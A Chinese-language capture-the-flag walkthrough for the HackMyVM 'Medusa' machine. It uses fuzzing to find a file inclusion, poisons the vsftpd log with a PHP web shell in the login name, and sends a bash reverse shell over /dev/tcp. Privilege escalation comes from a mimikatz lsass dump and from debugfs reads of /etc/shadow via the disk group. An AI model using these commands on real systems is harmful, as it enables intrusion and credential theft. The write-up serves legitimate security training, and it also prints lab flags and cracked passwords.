# Medusa

2025.02.20 https://hackmyvm.eu/machines/machine.php?vm=Medusa

[video]()

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

ftp 不允许匿名登陆。

80 扫描出 http://192.168.5.40/hades 再次扫描发现 http://192.168.5.40/hades/door.php 要输入密码，进行爆破：

```
ffuf -t 100 -ac -c -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt -u http://192.168.5.40/hades/d00r_validation.php -X POST -d 'word=FUZZ' -H 'Content-Type: text/html; charset=UTF-8'
```

但是没有找到，在回顾 apache 的工作页面中有这样一句话：However, check Kraken open the door. 输入魔术字: Kraken 得到了新的提示：medusa.hmv 添加到 hosts 文件，再次扫描，没有扫描到，在扫描一下 vhost：

```
gobuster vhost -t 64 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --domain medusa.hmv -u http://192.168.5.40/
```

发现 dev.medusa.hmv 将其加入 hosts 文件，对其扫描：

```
gobuster dir -t 64 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dev.medusa.hmv/ -e -x php,txt
```

发现几个连接：

```
http://dev.medusa.hmv/files/system.php
http://dev.medusa.hmv/files/index.php
```

页面都是空页面，可能有参数，ffuf 进行探测：

```
ffuf -t 100 -ac -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd
```

发现 view 参数，curl http://dev.medusa.hmv/files/system.php?view=/etc/passwd 发现存在文件包含，对其再次探测，发现能够读取 ftp 的日志文件： /var/log/vsftpd.log 文件，可以将 php 脚本植入到登陆的用户名中，从而实现 RCE：

```
ftp 192.168.5.40
Connected to 192.168.5.40.
220 (vsFTPd 3.0.3)
Name (192.168.5.40:kali): <?php system($_GET[1]); ?>

curl 'http://dev.medusa.hmv/files/system.php?view=/var/log/vsftpd.log&1=id'

Thu Feb 20 05:22:28 2025 [pid 5391] [uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

直接执行反弹 shell:

```
curl -G --data-urlencode 'view=/var/log/vsftpd.log' --data-urlencode '1=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' http://dev.medusa.hmv/files/system.php
```

得到反弹的 shell，发现一个用户 spectre ，无权限读取 user flag，进行提权。

枚举发现文件 /.../old_files.zip 传输到 kali，有密码，使用 John 解密发现密码 medusa666 ，解压后是 lsass.DMP 文件，可以使用 mimikatz 进行读取，得到密码：

```
mimikatz.exe
sekurlsa::minidump lsass.DMP
sekurlsa::logonpasswords full
```

发现用户 spectre 的密码是 5p3ctr3_p0is0n_xX , 切换到该用户，获得了 user flag:

```
spectre@medusa:~$ cat  user.txt
good job!

487a5d1ce02c53fbf60c3abd300d9ff5
```

发现当前用户属于 disk 组，可以利用 debugfs 进行提权：

```
df -h
debugfs /dev/sda1
cat /etc/shadow
root:$y$j9T$AjVXCCcjJ6jTodR8BwlPf.$4NeBwxOq4X0/0nCh3nrIBmwEEHJ6/kDU45031VFCWc2:19375:0:99999:7:::
```

对哈希进行破解，得到 root 密码 andromeda 切换到 root 获得 root flag：

```
root@medusa:~# cat .rO0t.txt
congrats hacker :)

34b1e6fc5e7fe0bfd56ed4b8776c9f5b
```

看看配置的 vhost 信息：

```
<VirtualHost *:80>
 ServerName dev.medusa.hmv
 DocumentRoot /var/www/dev
 <Directory /var/www/dev>
   AllowOverride All
 </Directory>
</VirtualHost>
```
